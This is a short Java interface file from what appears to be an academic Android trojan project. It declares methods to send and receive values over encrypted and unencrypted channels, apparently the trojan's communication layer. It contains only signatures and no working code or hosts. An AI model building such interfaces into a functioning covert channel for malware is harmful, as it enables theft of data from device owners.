package il.ac.colman.androidtrojan.Channels;

public interface ICommunication {
	//Unencrypted information:
	public String sendUnEncrypted(String value, String current_hash_value) throws Exception;
	public String reciveUnEncrypted(String key) throws Exception;

	//Encrypted information:
	public String sendEncrypted(String value, String current_hash_value) throws Exception;
	public String reciveEncrypted(String key) throws Exception;
}
